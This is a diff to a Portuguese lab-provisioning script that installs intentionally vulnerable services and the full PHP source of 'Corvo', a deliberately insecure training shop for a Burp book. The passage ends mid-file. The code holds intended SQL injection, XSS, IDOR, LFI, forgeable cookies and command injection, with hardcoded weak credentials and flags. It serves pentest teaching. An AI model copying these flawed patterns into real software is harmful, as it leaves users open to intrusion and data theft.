@@ -114,7 +114,7 @@ do_reip() {
 }
 
 # ---------------------------------------------------------- registro de módulos
-MODS=(base ssh ftp vsftpd234 ftpdos samba dns web apache nginx nfs smtp redis log4j snmp mysql postgres tomcat wordpress phpmyadmin privesc)
+MODS=(base ssh ftp vsftpd234 ftpdos samba dns web corvo apache apachecve nginx nginxcve nfs smtp redis log4j snmp mysql postgres tomcat wordpress phpmyadmin rservices telnetd unrealircd javarmi distcc privesc)
 declare -A TITLE
 TITLE[base]="Usuários e senhas fracas (+ flag de foothold)"
 TITLE[ssh]="SSH com senha fraca / login de root"
@@ -124,6 +124,7 @@ TITLE[ftpdos]="FTP legado 2.3.2 na porta 2100: DoS por glob (CVE-2011-0762)"
 TITLE[samba]="Samba/NetBIOS aberto a convidado (enum4linux)"
 TITLE[dns]="DNS com transferência de zona liberada (AXFR)"
 TITLE[web]="App web: SQLi, XSS, LFI, upload/RCE, cmd injection"
+TITLE[corvo]="Loja web Corvo vulneravel (:8090) — alvo do livro Burp para Hackers"
 TITLE[apache]="Apache mal configurado (server-status, userdir, listing, .htpasswd)"
 TITLE[nginx]="nginx com path traversal (alias) e .git exposto (:8080)"
 TITLE[nfs]="NFS com no_root_squash + RPC/rpcbind (rpcinfo/showmount)"
@@ -136,6 +137,13 @@ TITLE[postgres]="PostgreSQL exposto + superuser fraco (COPY FROM PROGRAM = RCE)"
 TITLE[tomcat]="Tomcat manager com credenciais fracas (deploy WAR = RCE)"
 TITLE[wordpress]="WordPress com admin fraco + user enum (via wp-cli)"
 TITLE[phpmyadmin]="phpMyAdmin exposto (usa as creds do mysql)"
+TITLE[apachecve]="Apache 2.4.49 legado emulado :8081 (CVE-2021-41773/42013 RCE, 2024-40725 fonte, 2025-49630 DoS)"
+TITLE[nginxcve]="nginx 1.26.0 vulneravel real :8084 (CVE-2026-42533: DoS por captura-clobber no script engine)"
+TITLE[rservices]="r-services (rsh/rlogin) com confiança .rhosts '+ +' -> shell sem senha (512-514)"
+TITLE[telnetd]="telnetd (GNU Inetutils) CVE-2026-24061: USER='-f root' -> login root sem senha (23) [KEV]"
+TITLE[unrealircd]="UnrealIRCd 3.2.8.1 com backdoor de cadeia de suprimentos (CVE-2010-2075) na 6667"
+TITLE[javarmi]="Java RMI registry REAL exposto (1099): classloading remoto = RCE (java_rmi_server)"
+TITLE[distcc]="distccd REAL exposto (3632): execução de comando via job de compilação (distcc_exec)"
 TITLE[privesc]="Escalação de privilégio (SUID, sudo, cron)"
 
 usage() {
@@ -212,6 +220,9 @@ fi
 
 # --------------------------------------------------------------------- flags --
 rnd() { head -c4 /dev/urandom | od -An -tx1 | tr -d ' \n'; }
+SELF_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+GAB=/root/GABARITO.md
+gab() { printf '%s\n' "$*" >> "$GAB"; }
 FLAG_WEB="FLAG{web_sqli_$(rnd)}"
 FLAG_USER="FLAG{foothold_$(rnd)}"
 FLAG_ROOT="FLAG{root_$(rnd)}"
@@ -228,8 +239,18 @@ FLAG_PG="FLAG{pg_$(rnd)}"
 FLAG_TOMCAT="FLAG{tomcat_$(rnd)}"
 FLAG_WP="FLAG{wordpress_$(rnd)}"
 FLAG_FTPBD="FLAG{ftp_vsftpd234_backdoor_$(rnd)}"
+FLAG_APACHECVE="FLAG{apache_cve41773_$(rnd)}"
+FLAG_APACHESRC="FLAG{apache_cve40725_$(rnd)}"
+FLAG_RSH="FLAG{rservices_rhosts_$(rnd)}"
+FLAG_TELNET="FLAG{telnet_cve24061_$(rnd)}"
+FLAG_IRC="FLAG{irc_unrealircd_$(rnd)}"
+FLAG_RMI="FLAG{javarmi_$(rnd)}"
+FLAG_DISTCC="FLAG{distcc_$(rnd)}"
 
 # gabarito (só para o instrutor)
+: > "$GAB"; chmod 0600 "$GAB"
+gab "# Gabarito — laboratório vulnerável (só para o instrutor)"
+gab ""; gab "Módulos instalados: ${CHOSEN[*]}"; gab ""
 
 log "Provisionando: ${CHOSEN[*]}"
 
@@ -726,6 +747,1326 @@ EOF
   svc apache2
 }
 
+
+mod_corvo() {
+  info "== corvo: loja web vulneravel do livro Burp para Hackers (:8090) =="
+  # App PHP+SQLite propositalmente vulneravel (SQLi, XSS, IDOR, CSRF, LFI,
+  # upload->RCE, cmd injection, verb/param tampering, sessao forjavel). Fonte
+  # unica do alvo do livro 'Burp para Hackers'. Roda como o usuario 'user'
+  # (uid 1000), como o livro mostra na saida de id da RCE.
+  # So instala se faltar: VM nova (online) instala; alvo ja provisionado (offline)
+  # pula o apt e apenas atualiza o codigo/servico.
+  if ! command -v php >/dev/null 2>&1 || ! php -m 2>/dev/null | grep -qi pdo_sqlite; then
+    apt_install php-cli php-sqlite3
+  fi
+  local C=/opt/corvo
+  rm -rf "$C"; mkdir -p "$C"
+  mkdir -p "$C/admin"
+  mkdir -p "$C/paginas"
+  mkdir -p "$C/privado"
+  mkdir -p "$C/uploads"
+
+  cat > "$C/config.php" <<'CORVO_EOF'
+<?php
+// Corvo — configuração do alvo de treino.
+// ⚠️ App PROPOSITALMENTE VULNERÁVEL. Uso exclusivo na rede isolada do laboratório (alvo 10.137.0.24).
+// Nada aqui é seguro por design: é material didático do livro "Burp para Hackers".
+
+define('CORVO_DB', __DIR__ . '/db.sqlite');   // banco SQLite (criado no 1º acesso)
+define('CORVO_UPLOADS', __DIR__ . '/uploads'); // destino dos uploads (webshell mora aqui)
+
+// Credenciais do "banco de negócio" — deixadas no código e num backup .bak exposto
+// (falha de exposição de informação; o capítulo de recon acha o config.php.bak).
+define('DB_USER', 'corvo_app');
+define('DB_PASS', 'corvo_app_2024');
+
+// Segredo usado para "assinar" o cookie de sessão. Curto e adivinhável de propósito
+// (o capítulo do Decoder forja um cookie de admin a partir daqui).
+define('CORVO_SEGREDO', 'corvo');
+
+date_default_timezone_set('America/Sao_Paulo');
+CORVO_EOF
+  cat > "$C/config.php.bak" <<'CORVO_EOF'
+<?php
+// ⚠️ BACKUP EXPOSTO (falha de exposição de informação, CWE-530).
+// Servido como texto puro por não terminar em .php ativo — o recon acha pelo robots.txt.
+define('CORVO_DB', __DIR__ . '/db.sqlite');
+define('DB_USER', 'corvo_app');
+define('DB_PASS', 'corvo_app_2024');
+define('CORVO_SEGREDO', 'corvo');   // o segredo que assina o cookie de sessão
+CORVO_EOF
+  cat > "$C/_sessao.php" <<'CORVO_EOF'
+<?php
+// Sessão do Corvo por COOKIE assinado — sem estado no servidor, de propósito.
+// O cookie é base64("id:usuario:papel:assinatura"), e a assinatura é
+// md5(CORVO_SEGREDO . id). Como o segredo é curto e conhecido, o cookie é
+// FORJÁVEL: o capítulo do Decoder troca papel=cliente por papel=admin e
+// recalcula a assinatura. Falha clássica de controle de acesso client-side.
+require_once __DIR__ . '/config.php';
+
+function corvo_assinatura(int $id): string {
+    return md5(CORVO_SEGREDO . $id);
+}
+
+function corvo_login_cookie(array $u): void {
+    $raw = $u['id'] . ':' . $u['usuario'] . ':' . $u['papel'] . ':' . corvo_assinatura((int)$u['id']);
+    setcookie('corvo_sessao', base64_encode($raw), 0, '/');   // sem HttpOnly, sem Secure (falha)
+}
+
+function corvo_usuario_atual(): ?array {
+    if (empty($_COOKIE['corvo_sessao'])) return null;
+    $raw = base64_decode($_COOKIE['corvo_sessao'], true);
+    if ($raw === false) return null;
+    $p = explode(':', $raw);
+    if (count($p) !== 4) return null;
+    [$id, $usuario, $papel, $sig] = $p;
+    if (!ctype_digit($id) || $sig !== corvo_assinatura((int)$id)) return null;
+    return ['id' => (int)$id, 'usuario' => $usuario, 'papel' => $papel];
+}
+
+function corvo_logout(): void {
+    setcookie('corvo_sessao', '', time() - 3600, '/');
+}
+CORVO_EOF
+  cat > "$C/_db.php" <<'CORVO_EOF'
+<?php
+// Camada de banco do Corvo: abre o SQLite e, se ele ainda não existe, cria o schema
+// e popula os dados de treino (idempotente — só semeia quando o arquivo está ausente).
+require_once __DIR__ . '/config.php';
+
+function corvo_db(): PDO {
+    static $pdo = null;
+    if ($pdo !== null) return $pdo;
+
+    $novo = !file_exists(CORVO_DB);
+    $pdo = new PDO('sqlite:' . CORVO_DB);
+    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+    // ⚠️ Mensagens de erro do SQLite vazam para a página (ajuda a SQLi baseada em erro).
+    $pdo->exec('PRAGMA foreign_keys = ON');
+    if ($novo) corvo_semear($pdo);
+    return $pdo;
+}
+
+function corvo_semear(PDO $pdo): void {
+    $pdo->exec(<<<SQL
+        CREATE TABLE usuarios (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            usuario  TEXT UNIQUE NOT NULL,
+            senha    TEXT NOT NULL,          -- texto puro de propósito (falha)
+            papel    TEXT NOT NULL DEFAULT 'cliente',
+            email    TEXT,
+            bio      TEXT,                    -- renderizada sem escape (XSS armazenado)
+            saldo    INTEGER NOT NULL DEFAULT 100,
+            secret   TEXT                     -- flag revelada ao dono da conta
+        );
+        CREATE TABLE produtos (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            nome TEXT NOT NULL,
+            preco INTEGER NOT NULL,           -- em centavos
+            descricao TEXT
+        );
+        CREATE TABLE comentarios (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            produto_id INTEGER NOT NULL,
+            autor TEXT NOT NULL,
+            corpo TEXT NOT NULL,              -- renderizado sem escape (XSS armazenado)
+            criado_em TEXT NOT NULL DEFAULT (datetime('now'))
+        );
+        CREATE TABLE mensagens (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            de_id INTEGER NOT NULL,
+            para_id INTEGER NOT NULL,
+            assunto TEXT NOT NULL,
+            corpo TEXT NOT NULL               -- privada; lida por id sem checar dono (IDOR)
+        );
+    SQL);
+
+    // Usuários: admin com segredo (alvo da SQLi), alguns clientes com senhas fracas
+    // (alvo do brute-force) e mensagens privadas (alvo do IDOR).
+    $us = [
+        // usuario, senha, papel, email, bio, saldo, secret
+        ['admin',  'C0rv0-N0turn0!2024', 'admin',   'admin@corvo.local',  'Administrador do Corvo.', 100000, 'FLAG{sqli_login_bypass_admin}'],
+        ['corvo',  'corvo',              'cliente', 'corvo@corvo.local',  'Conta de demonstração.',  500,    'FLAG{conta_demo}'],
+        ['joana',  'joana2023',          'cliente', 'joana@corvo.local',  'Cliente antiga.',         320,    'FLAG{idor_perfil_joana}'],
+        ['bruno',  'senha123',           'cliente', 'bruno@corvo.local',  'Gosta de promoções.',     80,     'FLAG{brute_force_bruno}'],
+        ['helena', 'primavera',          'cliente', 'helena@corvo.local', 'Compra todo mês.',        640,    'FLAG{msg_privada_helena}'],
+    ];
+    $st = $pdo->prepare('INSERT INTO usuarios(usuario,senha,papel,email,bio,saldo,secret) VALUES (?,?,?,?,?,?,?)');
+    foreach ($us as $u) $st->execute($u);
+
+    $ps = [
+        ['Caneca Corvo',       2990, 'Caneca preta com o logo do Corvo.'],
+        ['Camiseta Noturna',   5990, 'Algodão, estampa serigrafada.'],
+        ['Adesivo Holográfico',  990, 'Cartela com 5 adesivos.'],
+        ['Moletom Encapuzado', 12990, 'Com capuz. Edição limitada.'],
+    ];
+    $st = $pdo->prepare('INSERT INTO produtos(nome,preco,descricao) VALUES (?,?,?)');
+    foreach ($ps as $p) $st->execute($p);
+
+    $st = $pdo->prepare('INSERT INTO comentarios(produto_id,autor,corpo) VALUES (?,?,?)');
+    $st->execute([1, 'joana', 'Chegou rápido, recomendo!']);
+    $st->execute([1, 'bruno', 'A cor é linda.']);
+    $st->execute([2, 'helena', 'Serve certinho no P.']);
+
+    // Mensagem privada da helena com uma flag — só ela deveria ler (IDOR a expõe).
+    $st = $pdo->prepare('INSERT INTO mensagens(de_id,para_id,assunto,corpo) VALUES (?,?,?,?)');
+    $st->execute([1, 5, 'Seu cupom secreto', 'Oi Helena! Seu cupom: FLAG{msg_privada_helena}']);
+    $st->execute([1, 3, 'Bem-vinda de volta', 'Joana, sentimos sua falta no Corvo.']);
+}
+CORVO_EOF
+  cat > "$C/_layout.php" <<'CORVO_EOF'
+<?php
+// Cabeçalho/rodapé compartilhados do Corvo. Layout mínimo de propósito — o foco é
+// a superfície de ataque, não o CSS.
+require_once __DIR__ . '/_sessao.php';
+
+function corvo_topo(string $titulo = 'Corvo'): void {
+    $u = corvo_usuario_atual();
+    $quem = $u ? htmlspecialchars($u['usuario']) . ' (' . htmlspecialchars($u['papel']) . ')' : 'visitante';
+    header('X-Powered-By: Corvo/1.0 (PHP)');
+    echo "<!doctype html><html lang=pt-BR><head><meta charset=utf-8>";
+    echo "<meta name=viewport content='width=device-width,initial-scale=1'>";
+    echo "<title>" . htmlspecialchars($titulo) . " — Corvo</title>";
+    echo "<style>body{font-family:system-ui,Arial,sans-serif;max-width:820px;margin:1.5rem auto;padding:0 1rem;background:#0f0f12;color:#e6e6e6}"
+       . "a{color:#ff8a5c}h1,h2{color:#ff6633}nav{border-bottom:1px solid #333;padding-bottom:.5rem;margin-bottom:1rem;font-size:.9rem}"
+       . "input,textarea,button,select{font:inherit;padding:.35rem;background:#1b1b20;color:#eee;border:1px solid #444;border-radius:4px}"
+       . "button{background:#ff6633;color:#111;border:0;cursor:pointer;font-weight:bold}table{border-collapse:collapse}td,th{border:1px solid #333;padding:.3rem .6rem}"
+       . ".flag{color:#7CFC00;font-weight:bold}.aviso{color:#888;font-size:.8rem}</style></head><body>";
+    echo "<nav><b style='color:#ff6633'>▲ CORVO</b> · <a href='/index.php'>Loja</a> · <a href='/busca.php'>Busca</a> · "
+       . "<a href='/login.php'>Entrar</a> · <a href='/conta.php'>Minha conta</a> · <a href='/carrinho.php'>Carrinho</a> "
+       . "<span style='float:right' class=aviso>você: $quem</span></nav>";
+}
+
+function corvo_rodape(): void {
+    echo "<hr style='border-color:#222;margin-top:2rem'><p class=aviso>Corvo — loja fictícia de treino. "
+       . "Ambiente propositalmente vulnerável do livro <i>Burp para Hackers</i>. Não exponha à internet.</p></body></html>";
+}
+CORVO_EOF
+  cat > "$C/seed.php" <<'CORVO_EOF'
+<?php
+// Reseta o laboratório: apaga o banco e o contador, e recria tudo do zero.
+// Uso:  php seed.php    (linha de comando)  —  ou acesse /seed.php no navegador.
+require_once __DIR__ . '/config.php';
+@unlink(CORVO_DB);
+@unlink(CORVO_DB . '.contador');
+// Remove webshells e uploads deixados por exercícios anteriores (preserva o LEIA.txt).
+foreach (glob(__DIR__ . '/uploads/*') as $f) {
+    if (basename($f) !== 'LEIA.txt') @unlink($f);
+}
+require_once __DIR__ . '/_db.php';
+corvo_db();   // recria + semeia
+$msg = 'Laboratório Corvo resetado: banco recriado e uploads limpos.';
+if (PHP_SAPI === 'cli') { echo $msg . "\n"; } else { header('Content-Type: text/plain; charset=utf-8'); echo $msg; }
+CORVO_EOF
+  cat > "$C/admin/index.php" <<'CORVO_EOF'
+<?php
+require_once __DIR__ . '/../_db.php';
+require_once __DIR__ . '/../_layout.php';
+$db = corvo_db();
+$u = corvo_usuario_atual();
+
+corvo_topo('Painel interno');
+echo '<h1>Painel interno do Corvo</h1>';
+
+// ⚠️ FALHA: o painel só é "protegido" por NÃO estar linkado (segurança por obscuridade,
+// CWE-425 forced browsing) + uma checagem baseada no cookie FORJÁVEL. Um cookie de admin
+// falsificado no Decoder, ou o admin obtido por SQLi, abre tudo aqui.
+if (!$u || $u['papel'] !== 'admin') {
+    http_response_code(403);
+    echo '<p style="color:#ff6633">Acesso restrito a administradores.</p>';
+    echo '<p class="aviso">Você chegou aqui por descoberta de conteúdo. Falta o cookie de admin.</p>';
+    corvo_rodape();
+    exit;
+}
+
+echo '<p class="flag">Painel aberto: FLAG{admin_panel_acesso}</p>';
+echo '<h2>Usuários</h2><table><tr><th>id</th><th>usuário</th><th>papel</th><th>senha</th><th>segredo</th></tr>';
+foreach ($db->query('SELECT id,usuario,papel,senha,secret FROM usuarios') as $r) {
+    echo '<tr><td>' . (int)$r['id'] . '</td><td>' . htmlspecialchars($r['usuario']) . '</td><td>'
+       . htmlspecialchars($r['papel']) . '</td><td>' . htmlspecialchars($r['senha']) . '</td><td class="flag">'
+       . htmlspecialchars($r['secret']) . '</td></tr>';
+}
+echo '</table>';
+corvo_rodape();
+CORVO_EOF
+  cat > "$C/busca.php" <<'CORVO_EOF'
+<?php
+require_once __DIR__ . '/_db.php';
+require_once __DIR__ . '/_layout.php';
+$db = corvo_db();
+$q = $_GET['q'] ?? '';
+
+corvo_topo('Busca');
+echo '<h1>Busca de produtos</h1>';
+echo '<form method="get"><input name="q" value="' . htmlspecialchars($q) . '" placeholder="ex.: caneca"> <button>Buscar</button></form>';
+
+if ($q !== '') {
+    // ⚠️ FALHA: o termo volta na página SEM escape (XSS refletido, CWE-79).
+    echo "<p>Resultados para: <b>$q</b></p>";
+
+    // ⚠️ FALHA: termo concatenado na consulta (SQL injection, CWE-89) — permite UNION.
+    $sql = "SELECT id,nome,preco FROM produtos WHERE nome LIKE '%$q%'";
+    try {
+        $rs = $db->query($sql)->fetchAll(PDO::FETCH_ASSOC);
+        if (!$rs) echo '<p class="aviso">Nenhum produto.</p>';
+        echo '<ul>';
+        foreach ($rs as $p) {
+            echo '<li><a href="/produto.php?id=' . (int)$p['id'] . '">' . htmlspecialchars($p['nome'])
+               . '</a> — R$ ' . number_format($p['preco'] / 100, 2, ',', '.') . '</li>';
+        }
+        echo '</ul>';
+    } catch (Throwable $e) {
+        echo '<p style="color:#ff6633">Erro na consulta: ' . htmlspecialchars($e->getMessage()) . '</p>';
+    }
+}
+corvo_rodape();
+CORVO_EOF
+  cat > "$C/carrinho.php" <<'CORVO_EOF'
+<?php
+require_once __DIR__ . '/_db.php';
+require_once __DIR__ . '/_layout.php';
+$db = corvo_db();
+
+corvo_topo('Carrinho');
+echo '<h1>Carrinho</h1>';
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // ⚠️ FALHA: o servidor confia no PREÇO e na QTD que vieram do cliente
+    // (parameter tampering / falha de lógica de negócio, CWE-602/CWE-840).
+    // A validação de "só números" é só no HTML (pattern) — o Burp passa por cima.
+    $pid   = (int)($_POST['produto_id'] ?? 0);
+    $preco = (int)($_POST['preco'] ?? 0);   // deveria vir do banco, não do POST
+    $qtd   = (int)($_POST['qtd'] ?? 1);      // aceita negativo
+    $prod  = $db->query('SELECT nome FROM produtos WHERE id=' . $pid)->fetchColumn();
+    $total = $preco * $qtd;
+
+    echo '<p>Item: <b>' . htmlspecialchars($prod ?: '???') . '</b></p>';
+    echo '<p>Preço unitário enviado: R$ ' . number_format($preco / 100, 2, ',', '.') . '</p>';
+    echo '<p>Quantidade: ' . $qtd . '</p>';
+    echo '<p>Total cobrado: <b>R$ ' . number_format($total / 100, 2, ',', '.') . '</b></p>';
+
+    // "Vitória": conseguir o pedido por menos de R$ 1,00 (preço ou qtd adulterados).
+    if ($prod && $total < 100) {
+        echo '<p class="flag">Pedido fechado por uma pechincha impossível: FLAG{param_tampering_preco}</p>';
+    }
+    echo '<p><a href="/index.php">Continuar comprando</a></p>';
+} else {
+    echo '<p>Seu carrinho está vazio. Escolha um <a href="/index.php">produto</a> e adicione.</p>';
+}
+corvo_rodape();
+CORVO_EOF
+  cat > "$C/comentar.php" <<'CORVO_EOF'
+<?php
+require_once __DIR__ . '/_db.php';
+$db = corvo_db();
+$pid = (int)($_POST['produto_id'] ?? 0);
+$autor = trim($_POST['autor'] ?? 'anon');
+$corpo = $_POST['corpo'] ?? '';
+if ($pid && $corpo !== '') {
+    // ⚠️ FALHA: comentário guardado como veio; será renderizado sem escape (XSS armazenado).
+    $st = $db->prepare('INSERT INTO comentarios(produto_id,autor,corpo) VALUES (?,?,?)');
+    $st->execute([$pid, $autor === '' ? 'anon' : $autor, $corpo]);
+}
+header('Location: /produto.php?id=' . $pid);
+CORVO_EOF
+  cat > "$C/conta.php" <<'CORVO_EOF'
+<?php
+require_once __DIR__ . '/_db.php';
+require_once __DIR__ . '/_layout.php';
+$db = corvo_db();
+$u = corvo_usuario_atual();
+
+corvo_topo('Minha conta');
+if (!$u) {
+    echo '<h1>Minha conta</h1><p>Você precisa <a href="/login.php">entrar</a>.</p>';
+    corvo_rodape();
+    exit;
+}
+
+// Recarrega do banco pelo id do cookie (o cookie forjado no cap. do Decoder chega aqui).
+$dados = $db->query('SELECT * FROM usuarios WHERE id=' . (int)$u['id'])->fetch(PDO::FETCH_ASSOC);
+?>
+<h1>Olá, <?= htmlspecialchars($dados['usuario']) ?></h1>
+<p>Papel: <b><?= htmlspecialchars($dados['papel']) ?></b> · Saldo: <b><?= (int)$dados['saldo'] ?> pontos</b></p>
+<p>E-mail: <?= htmlspecialchars($dados['email']) ?></p>
+<p>Seu segredo de conta: <span class="flag"><?= htmlspecialchars($dados['secret']) ?></span></p>
+<p><a href="/mensagem.php?id=1">Ver suas mensagens</a> · <a href="/transferir.php">Transferir pontos</a> · <a href="/logout.php">Sair</a></p>
+<?php if ($u['papel'] === 'admin'): ?>
+  <p style="color:#ff6633">Você é administrador. <a href="/admin/">Abrir painel interno</a>.</p>
+<?php endif ?>
+<?php corvo_rodape();
+CORVO_EOF
+  cat > "$C/convite.php" <<'CORVO_EOF'
+<?php
+require_once __DIR__ . '/_layout.php';
+// Emite um "token de convite" NOVO a cada requisição — alvo do Burp Sequencer.
+//
+// ⚠️ FALHA (modo padrão): o token é derivado do relógio + um contador sequencial,
+// então seus bits de mais alta ordem quase não mudam entre capturas. O Sequencer
+// classifica a aleatoriedade como "extremely poor" (CWE-330/CWE-340).
+//
+// ?forte=1  usa um gerador criptográfico (random_bytes) — o contraste que o
+// Sequencer mostra como "excellent". Sirva para comparar os dois veredictos.
+
+$arqContador = __DIR__ . '/db.sqlite.contador';
+$n = (int)@file_get_contents($arqContador);
+@file_put_contents($arqContador, (string)($n + 1), LOCK_EX);
+
+if (!empty($_GET['forte'])) {
+    $token = bin2hex(random_bytes(12));                 // 96 bits de CSPRNG
+} else {
+    // 4 bytes de tempo (quase constantes na captura) + 2 bytes de contador sequencial.
+    $token = bin2hex(pack('N', time()) . pack('n', $n & 0xffff));
+}
+
+setcookie('token_convite', $token, 0, '/');
+corvo_topo('Convite');
+echo '<h1>Seu convite</h1>';
+echo '<p>Token de convite: <code>' . htmlspecialchars($token) . '</code></p>';
+echo '<form method="get"><input type="hidden" name="pegar" value="1"><button>Gerar outro</button></form>';
+echo '<p class="aviso">O token também vem no cabeçalho Set-Cookie (token_convite), '
+   . 'que é de onde o Sequencer captura ao vivo. Use ?forte=1 para o gerador seguro.</p>';
+corvo_rodape();
+CORVO_EOF
+  cat > "$C/index.php" <<'CORVO_EOF'
+<?php
+require_once __DIR__ . '/_db.php';
+require_once __DIR__ . '/_layout.php';
+$db = corvo_db();
+corvo_topo('Loja');
+$produtos = $db->query('SELECT id,nome,preco,descricao FROM produtos')->fetchAll(PDO::FETCH_ASSOC);
+?>
+<h1>Loja Corvo</h1>
+<p>Bem-vindo à loja fictícia do Corvo. Navegue pelos produtos, comente e compre — tudo em laboratório.</p>
+<!-- TODO(dev): tirar o backup config.php.bak do ar antes de publicar -->
+<!-- painel interno fica em /admin/ (não linkar no menu público) -->
+<ul>
+<?php foreach ($produtos as $p): ?>
+  <li>
+    <a href="/produto.php?id=<?= (int)$p['id'] ?>"><?= htmlspecialchars($p['nome']) ?></a>
+    — R$ <?= number_format($p['preco'] / 100, 2, ',', '.') ?>
+    <div class="aviso"><?= htmlspecialchars($p['descricao']) ?></div>
+  </li>
+<?php endforeach ?>
+</ul>
+<p><a href="/busca.php">Buscar produtos</a> · <a href="/login.php">Entrar</a></p>
+<?php corvo_rodape();
+CORVO_EOF
+  cat > "$C/login.php" <<'CORVO_EOF'
+<?php
+require_once __DIR__ . '/_db.php';
+require_once __DIR__ . '/_layout.php';
+$db = corvo_db();
+
+$msg = '';
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $u = $_POST['usuario'] ?? '';
+    $p = $_POST['senha'] ?? '';
+
+    // ⚠️ FALHA: entrada concatenada direto na consulta (SQL injection, CWE-89).
+    // Um `admin'-- ` no usuário derruba a checagem de senha.
+    $sql = "SELECT id,usuario,papel,secret FROM usuarios WHERE usuario='$u' AND senha='$p'";
+    $linha = false;
+    try {
+        $linha = $db->query($sql)->fetch(PDO::FETCH_ASSOC);
+    } catch (Throwable $e) {
+        // ⚠️ FALHA: erro do banco vaza para a tela (ajuda SQLi baseada em erro).
+        $msg = 'Erro na consulta: ' . htmlspecialchars($e->getMessage());
+    }
+
+    if ($linha) {
+        corvo_login_cookie($linha);
+        header('Location: /conta.php');
+        exit;
+    } elseif ($msg === '') {
+        // ⚠️ FALHA: mensagens diferentes por caso permitem ENUMERAR usuários
+        // (Comparer detecta a diferença byte a byte).
+        $existe = $db->query("SELECT 1 FROM usuarios WHERE usuario='$u'")->fetch();
+        $msg = $existe ? 'Senha incorreta para este usuário.' : 'Usuário não encontrado.';
+    }
+}
+
+corvo_topo('Entrar');
+?>
+<h1>Área restrita</h1>
+<?php if ($msg): ?><p style="color:#ff6633"><?= $msg ?></p><?php endif ?>
+<form method="post">
+  <p>Usuário: <input name="usuario" autofocus></p>
+  <p>Senha: <input name="senha" type="password"></p>
+  <button>Entrar</button>
+</form>
+<p class="aviso">Dica de laboratório: contas de cliente têm senhas fracas.</p>
+<?php corvo_rodape();
+CORVO_EOF
+  cat > "$C/logout.php" <<'CORVO_EOF'
+<?php
+require_once __DIR__ . '/_sessao.php';
+corvo_logout();
+header('Location: /index.php');
+CORVO_EOF
+  cat > "$C/mensagem.php" <<'CORVO_EOF'
+<?php
+require_once __DIR__ . '/_db.php';
+require_once __DIR__ . '/_layout.php';
+$db = corvo_db();
+
+// ⚠️ FALHA: lê a mensagem pelo id sem conferir o destinatário (IDOR, CWE-639).
+// A conta liga para ?id=1; trocar o id (Intruder) lê a correspondência alheia.
+$id = (int)($_GET['id'] ?? 0);
+$m = $db->query('SELECT * FROM mensagens WHERE id=' . $id)->fetch(PDO::FETCH_ASSOC);
+
+corvo_topo('Mensagem');
+if (!$m) { echo '<p>Mensagem não encontrada.</p>'; corvo_rodape(); exit; }
+$de   = $db->query('SELECT usuario FROM usuarios WHERE id=' . (int)$m['de_id'])->fetchColumn();
+$para = $db->query('SELECT usuario FROM usuarios WHERE id=' . (int)$m['para_id'])->fetchColumn();
+?>
+<h1><?= htmlspecialchars($m['assunto']) ?></h1>
+<p class="aviso">de <?= htmlspecialchars($de) ?> · para <?= htmlspecialchars($para) ?></p>
+<p><?= htmlspecialchars($m['corpo']) ?></p>
+<p class="aviso"><a href="/mensagem.php?id=<?= $id - 1 ?>">‹ anterior</a> · <a href="/mensagem.php?id=<?= $id + 1 ?>">próxima ›</a></p>
+<?php corvo_rodape();
+CORVO_EOF
+  cat > "$C/pagina.php" <<'CORVO_EOF'
+<?php
+require_once __DIR__ . '/_layout.php';
+// Inclui uma "página" a partir do parâmetro, sem sanitização.
+// ⚠️ FALHA: path traversal / LFI (CWE-22/CWE-98). `?arquivo=../privado/flag_lfi.txt`
+// escapa do diretório paginas/; `../config.php` vaza o código-fonte com credenciais.
+$arquivo = $_GET['arquivo'] ?? 'sobre.html';
+$caminho = __DIR__ . '/paginas/' . $arquivo;
+corvo_topo('Página');
+echo '<h1>Central de conteúdo</h1>';
+echo '<p><a href="/pagina.php?arquivo=sobre.html">Sobre</a> · <a href="/pagina.php?arquivo=ajuda.html">Ajuda</a></p><hr>';
+if (is_file($caminho)) {
+    readfile($caminho);
+} else {
+    echo '<p>Conteúdo não encontrado: ' . htmlspecialchars($arquivo) . '</p>';
+}
+corvo_rodape();
+CORVO_EOF
+  cat > "$C/paginas/ajuda.html" <<'CORVO_EOF'
+<h2>Ajuda</h2><p>Dúvidas? Não existem: isto é um alvo de pentest.</p>
+CORVO_EOF
+  cat > "$C/paginas/sobre.html" <<'CORVO_EOF'
+<h2>Sobre o Corvo</h2><p>Loja fictícia de treino. Tudo aqui é cenário de laboratório.</p>
+CORVO_EOF
+  cat > "$C/perfil.php" <<'CORVO_EOF'
+<?php
+require_once __DIR__ . '/_db.php';
+require_once __DIR__ . '/_layout.php';
+$db = corvo_db();
+
+// ⚠️ FALHA: mostra QUALQUER perfil pelo id, sem checar se é o dono (IDOR, CWE-639).
+// Iterar ?id=1,2,3… (Intruder) despeja e-mail, saldo e o segredo de cada conta.
+$id = (int)($_GET['id'] ?? 0);
+$d = $db->query('SELECT id,usuario,papel,email,bio,saldo,secret FROM usuarios WHERE id=' . $id)->fetch(PDO::FETCH_ASSOC);
+
+corvo_topo('Perfil');
+if (!$d) { echo '<p>Perfil não encontrado.</p>'; corvo_rodape(); exit; }
+?>
+<h1>Perfil de <?= htmlspecialchars($d['usuario']) ?></h1>
+<!-- ⚠️ bio renderizada sem escape (XSS armazenado via bio) -->
+<p>Bio: <?= $d['bio'] ?></p>
+<table>
+  <tr><th>Papel</th><td><?= htmlspecialchars($d['papel']) ?></td></tr>
+  <tr><th>E-mail</th><td><?= htmlspecialchars($d['email']) ?></td></tr>
+  <tr><th>Saldo</th><td><?= (int)$d['saldo'] ?> pontos</td></tr>
+  <tr><th>Segredo</th><td class="flag"><?= htmlspecialchars($d['secret']) ?></td></tr>
+</table>
+<?php corvo_rodape();
+CORVO_EOF
+  cat > "$C/ping.php" <<'CORVO_EOF'
+<?php
+require_once __DIR__ . '/_layout.php';
+$host = $_GET['host'] ?? '';
+corvo_topo('Ping');
+echo '<h1>Ferramenta de rede</h1>';
+echo '<form method="get"><input name="host" value="' . htmlspecialchars($host) . '" placeholder="127.0.0.1"> <button>Pingar</button></form>';
+if ($host !== '') {
+    // ⚠️ FALHA: host concatenado direto no shell (OS command injection, CWE-78).
